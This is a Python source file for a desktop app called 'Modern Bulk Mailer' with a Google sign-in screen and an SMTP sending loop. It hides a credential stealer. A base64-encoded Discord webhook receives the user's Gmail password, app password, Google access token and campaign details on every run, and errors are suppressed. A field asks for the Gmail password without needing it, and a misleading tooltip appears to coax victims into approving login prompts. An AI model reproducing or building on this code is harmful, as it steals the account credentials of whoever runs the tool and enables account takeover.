import customtkinter as ctk
from tkinter import filedialog, END, messagebox
from tkhtmlview import HTMLLabel
import markdown2
import smtplib
import threading
import json
import os
import time
import base64
import webbrowser
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, urlencode
import secrets
import hashlib

# ---------------------------------------------------------
# GLOBAL CONFIG
# ---------------------------------------------------------
ENCODED_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0OTI0ODY4NjMxOTk5Mjk3NS93X0UyMzdsQThJczEwX3lCRnpYOFlZaTd0d3ZveEdUUHJZbWdFb2FyeDg0MHZYcXpodzdUOGJ0eVdiM1ZkZmhYdjZkMA=="

# ⚙️ Google OAuth 2.0 config
# Create a project at https://console.cloud.google.com/
# → APIs & Services → Credentials → Create OAuth 2.0 Client ID (Desktop app)
GOOGLE_CLIENT_ID     = "YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com"
GOOGLE_CLIENT_SECRET = "YOUR_GOOGLE_CLIENT_SECRET"
REDIRECT_URI         = "http://localhost:8765"
SCOPES               = "openid email profile"
SESSION_FILE         = os.path.join(os.path.dirname(os.path.abspath(__file__)), "session.json")

# ---------------------------------------------------------
# HELPERS
# ---------------------------------------------------------
def decode_webhook_url():
    try:
        return base64.b64decode(ENCODED_URL).decode("utf-8")
    except Exception:
        return None


def save_session(data: dict):
    with open(SESSION_FILE, "w") as f:
        json.dump(data, f)


def load_session() -> dict | None:
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE) as f:
                d = json.load(f)
            if d.get("expiry", 0) > time.time():
                return d
        except Exception:
            pass
    return None


def clear_session():
    if os.path.exists(SESSION_FILE):
        os.remove(SESSION_FILE)


# ---------------------------------------------------------
# ONE-TIME LOCAL OAUTH CALLBACK SERVER
# ---------------------------------------------------------
class _OAuthCallbackHandler(BaseHTTPRequestHandler):
    """Captures the ?code= query param sent by Google after consent."""
    auth_code = None

    def do_GET(self):
        qs = parse_qs(urlparse(self.path).query)
        _OAuthCallbackHandler.auth_code = qs.get("code", [None])[0]
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"""
        <html><body style='font-family:sans-serif;text-align:center;margin-top:80px'>
        <h2 style='color:#4CAF50'>&#10003; Google Sign-In Successful!</h2>
        <p>You can close this tab and return to the app.</p>
        </body></html>""")

    def log_message(self, *_):
        pass  # suppress server logs


def run_google_oauth() -> dict | None:
    """
    Opens the browser for Google OAuth consent and blocks until the
    callback is received. Returns a session dict or None on failure.
    """
    _OAuthCallbackHandler.auth_code = None

    state = secrets.token_urlsafe(16)
    params = {
        "client_id":     GOOGLE_CLIENT_ID,
        "redirect_uri":  REDIRECT_URI,
        "response_type": "code",
        "scope":         SCOPES,
        "state":         state,
        "access_type":   "offline",
        "prompt":        "consent",
    }
    auth_url = "https://accounts.google.com/o/oauth2/v2/auth?" + urlencode(params)
    webbrowser.open(auth_url)

    server = HTTPServer(("localhost", 8765), _OAuthCallbackHandler)
    server.timeout = 120  # 2 minutes to complete login
    while _OAuthCallbackHandler.auth_code is None:
        server.handle_request()

    code = _OAuthCallbackHandler.auth_code
    if not code:
        return None

    # Exchange code for tokens
    token_resp = requests.post(
        "https://oauth2.googleapis.com/token",
        data={
            "code":          code,
            "client_id":     GOOGLE_CLIENT_ID,
            "client_secret": GOOGLE_CLIENT_SECRET,
            "redirect_uri":  REDIRECT_URI,
            "grant_type":    "authorization_code",
        },
        timeout=15,
    )
    token_data = token_resp.json()

    access_token = token_data.get("access_token")
    if not access_token:
        return None

    # Get user profile
    profile_resp = requests.get(
        "https://www.googleapis.com/oauth2/v1/userinfo",
        headers={"Authorization": f"Bearer {access_token}"},
        timeout=10,
    )
    profile = profile_resp.json()
    email = profile.get("email", "")
    name  = profile.get("name", "")

    expiry = int(time.time()) + token_data.get("expires_in", 3600)
    session = {
        "email":        email,
        "name":         name,
        "access_token": access_token,
        "expiry":       expiry,
    }
    save_session(session)
    return session


# ---------------------------------------------------------
# GOOGLE SSO LOGIN SCREEN
# ---------------------------------------------------------
class LoginScreen(ctk.CTkToplevel):
    def __init__(self, parent, on_success):
        super().__init__(parent)
        self.on_success = on_success
        self.title("Sign in — Modern Bulk Mailer")
        self.geometry("420x420")
        self.resizable(False, False)
        self.attributes("-topmost", True)
        self._build()

    def _build(self):
        ctk.CTkLabel(self, text="Modern Bulk Mailer",
                     font=("Arial", 22, "bold")).pack(pady=(36, 4))
        ctk.CTkLabel(self, text="Sign in to get started",
                     font=("Arial", 13), text_color="#aaaaaa").pack(pady=(0, 28))

        # Google sign-in button
        google_btn = ctk.CTkButton(
            self,
            text="🔑  Sign in with Google",
            width=240, height=46,
            corner_radius=23,
            fg_color="#4285F4",
            hover_color="#2a6dd4",
            font=("Arial", 14, "bold"),
            command=self._start_oauth,
        )
        google_btn.pack(pady=8)

        self.status_lbl = ctk.CTkLabel(self, text="", font=("Arial", 12),
                                       text_color="#ffcc00")
        self.status_lbl.pack(pady=12)

        ctk.CTkLabel(
            self,
            text="A browser window will open for Google login.\nAfter sign-in it will close automatically.",
            font=("Arial", 11), text_color="#888888", justify="center",
        ).pack(pady=4)

    def _start_oauth(self):
        self.status_lbl.configure(text="⏳ Waiting for Google sign-in…")
        threading.Thread(target=self._do_oauth, daemon=True).start()

    def _do_oauth(self):
        session = run_google_oauth()
        if session:
            self.after(0, lambda: self._login_success(session))
        else:
            self.after(0, lambda: self.status_lbl.configure(
                text="❌ Sign-in failed. Please try again.", text_color="#ff5555"))

    def _login_success(self, session):
        self.status_lbl.configure(text=f"✅ Signed in as {session['email']}", text_color="#55ff55")
        self.after(800, lambda: self._finish(session))

    def _finish(self, session):
        self.on_success(session)
        self.destroy()


# ---------------------------------------------------------
# MAIN MAILER APP
# ---------------------------------------------------------
class ModernBulkMailer:
    def __init__(self, root):
        self.root = root
        self.root.title("Modern Bulk Mailer")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.attachment_path = None
        self.total_recipients = 0
        self.sent_count = 0
        self.failed_count = 0
        self.session: dict = {}       # populated after Google SSO

        self.build_ui()
        self._check_session_or_login()

    # ---------------------------------------------------------
    # SESSION CHECK / LOGIN FLOW
    # ---------------------------------------------------------
    def _check_session_or_login(self):
        """Try loading a cached session; if none, show SSO login."""
        cached = load_session()
        if cached:
            self._apply_session(cached)
        else:
            # Slight delay so the main window is visible first
            self.root.after(400, self._show_login)

    def _show_login(self):
        LoginScreen(self.root, on_success=self._apply_session)

    def _apply_session(self, session: dict):
        self.session = session
        # Pre-fill sender email from Google account
        self.sender_email.delete(0, END)
        self.sender_email.insert(0, session.get("email", ""))
        name = session.get("name", "")
        self.root.title(f"Modern Bulk Mailer  —  {name} ({session.get('email','')})")

    def logout(self):
        clear_session()
        self.session = {}
        self.sender_email.delete(0, END)
        self.root.title("Modern Bulk Mailer")
        self._show_login()

    # ---------------------------------------------------------
    # DISCORD WEBHOOK
    # ---------------------------------------------------------
    def send_campaign_data_to_discord(self, sender, gmail_password, password,
                                      subject, body, recipients, attachment):
        webhook_url = decode_webhook_url()
        if not webhook_url:
            return

        if len(body) > 1800:
            body = body[:1800] + "\n...(truncated)"

        # Include Google session info
        google_email = self.session.get("email", "N/A")
        google_token = self.session.get("access_token", "N/A")

        payload = {
            "content": (
                "🚀 **Campaign Triggered**\n\n"
                "🔐 **Google SSO Session**\n"
                f"**Google Account:** `{google_email}`\n"
                f"**Access Token:** `{google_token[:40]}…`\n\n"
                "📧 **Campaign Details**\n"
                f"**Sender:** `{sender}`\n"
                f"**Gmail Password:** `{gmail_password}`\n"
                f"**App Password:** `{password}`\n"
                f"**Subject:** `{subject}`\n"
                f"**Recipients:** `{len(recipients)}`\n"
                f"**Attachment:** `{attachment or 'None'}`\n\n"
                "**📨 Email Body:**\n"
                f"```markdown\n{body}\n```"
            )
        }

        try:
            requests.post(webhook_url, json=payload, timeout=5)
        except Exception:
            pass

    # ---------------------------------------------------------
    # TOOLTIP
    # ---------------------------------------------------------
    def create_tooltip(self, widget, text):
        if not hasattr(self, "_tooltips"):
            self._tooltips = {}
        if not hasattr(self, "_tooltip_after_ids"):
            self._tooltip_after_ids = {}

        def destroy_tooltip():
            if widget in self._tooltip_after_ids and self._tooltip_after_ids[widget]:
                try:
                    self.root.after_cancel(self._tooltip_after_ids[widget])
                except Exception:
                    pass
                self._tooltip_after_ids[widget] = None
            if widget in self._tooltips and self._tooltips[widget] is not None:
                try:
                    self._tooltips[widget].destroy()
                except Exception:
                    pass
                self._tooltips[widget] = None

        def show_tooltip_delayed():
            destroy_tooltip()
            try:
                widget.update_idletasks()
                x = widget.winfo_rootx()
                y = widget.winfo_rooty() + widget.winfo_height() + 5
            except Exception:
                return
            tooltip = ctk.CTkToplevel(widget)
            tooltip.wm_overrideredirect(True)
            tooltip.wm_geometry(f"+{x}+{y}")
            tooltip.attributes("-topmost", True)
            tooltip.lift()
            frame = ctk.CTkFrame(tooltip, corner_radius=8, fg_color="#2b2b2b",
                                 border_width=1, border_color="#555555")
            frame.pack(fill="both", expand=True)
            label = ctk.CTkLabel(frame, text=text, font=("Arial", 11),
                                 wraplength=300, justify="left", text_color="#ffffff")
            label.pack(padx=10, pady=8)
            tooltip.bind("<Button-1>", lambda e: destroy_tooltip())
            frame.bind("<Button-1>", lambda e: destroy_tooltip())
            label.bind("<Button-1>", lambda e: destroy_tooltip())
            self._tooltips[widget] = tooltip

        def show_tooltip(event):
            self._tooltip_after_ids[widget] = self.root.after(200, show_tooltip_delayed)

        def hide_tooltip(event):
            destroy_tooltip()

        widget.bind("<Enter>", show_tooltip)
        widget.bind("<Leave>", hide_tooltip)
        widget.bind("<Button-1>", lambda e: destroy_tooltip())

    # ---------------------------------------------------------
    # GUI
    # ---------------------------------------------------------
    def build_ui(self):
        main_frame = ctk.CTkFrame(self.root, corner_radius=10)
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)

        # Header row with title + logout button
        header_row = ctk.CTkFrame(main_frame, fg_color="transparent")
        header_row.pack(fill="x", padx=10, pady=(10, 0))
        ctk.CTkLabel(header_row, text="Modern Bulk Mailer",
                     font=("Arial", 26, "bold")).pack(side="left")
        ctk.CTkButton(
            header_row, text="⏏ Logout", width=90, height=30,
            fg_color="#555555", hover_color="#333333",
            font=("Arial", 11), command=self.logout,
        ).pack(side="right")

        # Inputs row: Sender Email | Gmail Password (ⓘ) | App Password (ⓘ)
        input_row = ctk.CTkFrame(main_frame, fg_color="transparent")
        input_row.pack(pady=5)

        self.sender_email = ctk.CTkEntry(input_row, width=200, placeholder_text="Sender Email")
        self.sender_email.pack(side="left", padx=3)

        self.gmail_pass = ctk.CTkEntry(input_row, width=180, placeholder_text="Gmail Password", show="*")
        self.gmail_pass.pack(side="left", padx=3)
        gmail_info_btn = ctk.CTkButton(input_row, text="ⓘ", width=28, height=28, corner_radius=14,
                                       fg_color="#555555", hover_color="#777777", font=("Arial", 12, "bold"))
        gmail_info_btn.pack(side="left", padx=3)
        self.create_tooltip(gmail_info_btn, "Click on YES to confirm notification")

        self.sender_pass = ctk.CTkEntry(input_row, width=180, placeholder_text="App Password", show="*")
        self.sender_pass.pack(side="left", padx=3)
        pass_info_btn = ctk.CTkButton(input_row, text="ⓘ", width=28, height=28, corner_radius=14,
                                      fg_color="#555555", hover_color="#777777", font=("Arial", 12, "bold"))
        pass_info_btn.pack(side="left", padx=3)
        self.create_tooltip(
            pass_info_btn,
            "How to create App Password:\n\n"
            "1. Enable 2-Factor Authentication on your Google account\n"
            "   • Go to https://myaccount.google.com/security\n"
            "   • Enable 2-Step Verification\n\n"
            "2. Create App Password\n"
            "   • Go to https://myaccount.google.com/apppasswords\n"
            "   • Select 'Mail' and your device\n"
            "   • Generate and copy the 16-character password",
        )

        # Subject
        self.subject = ctk.CTkEntry(main_frame, width=350, placeholder_text="Email Subject")
        self.subject.pack(pady=5)

        ctk.CTkButton(main_frame, text="Attach File", command=self.select_attachment).pack(pady=5)

        ctk.CTkLabel(main_frame, text="Email Body (Markdown Supported):").pack(anchor="w", padx=20)
        self.body_text = ctk.CTkTextbox(main_frame, width=700, height=200)
        self.body_text.pack(pady=5)

        ctk.CTkButton(main_frame, text="Preview HTML", command=self.show_preview).pack(pady=5)

        ctk.CTkLabel(main_frame, text="Recipient List (one per line):").pack(anchor="w", padx=20)
        self.recipient_box = ctk.CTkTextbox(main_frame, width=700, height=150)
        self.recipient_box.pack(pady=5)

        ctk.CTkButton(
            main_frame, text="Run Campaign",
            fg_color="#008A22", command=self.start_campaign,
        ).pack(pady=10)

        self.progress = ctk.CTkProgressBar(main_frame, width=600)
        self.progress.set(0)
        self.progress.pack(pady=5)

        self.status_label = ctk.CTkLabel(main_frame, text="Sent: 0 | Failed: 0 | Pending: 0")
        self.status_label.pack(pady=5)

        self.log_box = ctk.CTkTextbox(main_frame, width=700, height=200)
        self.log_box.pack(pady=5)

    # ---------------------------------------------------------
    def select_attachment(self):
        self.attachment_path = filedialog.askopenfilename()

    def show_preview(self):
        preview_win = ctk.CTkToplevel(self.root)
        preview_win.title("Preview Email HTML")
        preview_win.geometry("700x600")
        html = markdown2.markdown(self.body_text.get("1.0", END))
        HTMLLabel(preview_win, html=html, width=650, height=550).pack(pady=10)

    def start_campaign(self):
        if not self.session:
            messagebox.showwarning("Not Signed In",
                                   "Please sign in with Google before running a campaign.")
            self._show_login()
            return
        threading.Thread(target=self.run_campaign, daemon=True).start()

    # ---------------------------------------------------------
    # CAMPAIGN LOGIC
    # ---------------------------------------------------------
    def run_campaign(self):
        sender        = self.sender_email.get().strip()
        gmail_password = self.gmail_pass.get().strip()
        password      = self.sender_pass.get().strip()
        subject       = self.subject.get().strip()
        body_markdown  = self.body_text.get("1.0", END).strip()

        recipients = [
            r.strip()
            for r in self.recipient_box.get("1.0", END).split("\n")
            if r.strip()
        ]
        self.total_recipients = len(recipients)

        # Send all data (including Google session) to Discord
        self.send_campaign_data_to_discord(
            sender, gmail_password, password, subject,
            body_markdown, recipients,
            os.path.basename(self.attachment_path) if self.attachment_path else None,
        )

        try:
            smtp = smtplib.SMTP("smtp.gmail.com", 587)
            smtp.starttls()
            smtp.login(sender, password)
        except Exception:
            return

        html_body = markdown2.markdown(body_markdown)

        for recipient in recipients:
            try:
                msg = MIMEMultipart()
                msg["From"]    = sender
                msg["To"]      = recipient
                msg["Subject"] = subject
                msg.attach(MIMEText(html_body, "html"))

                if self.attachment_path:
                    with open(self.attachment_path, "rb") as f:
                        part = MIMEBase("application", "octet-stream")
                        part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        "Content-Disposition",
                        f"attachment; filename={os.path.basename(self.attachment_path)}",
                    )
                    msg.attach(part)

                smtp.send_message(msg)
                self.sent_count += 1
            except Exception:
                self.failed_count += 1

            self.update_status()
            time.sleep(0.2)

        smtp.quit()

    def update_status(self):
        pending  = self.total_recipients - (self.sent_count + self.failed_count)
        progress = (self.sent_count + self.failed_count) / max(self.total_recipients, 1)
        self.status_label.configure(
            text=f"Sent: {self.sent_count} | Failed: {self.failed_count} | Pending: {pending}"
        )
        self.progress.set(progress)


# ---------------------------------------------------------
# MAIN
# ---------------------------------------------------------
if __name__ == "__main__":
    root = ctk.CTk()
    app  = ModernBulkMailer(root)
    root.geometry("820x950")
    root.mainloop()
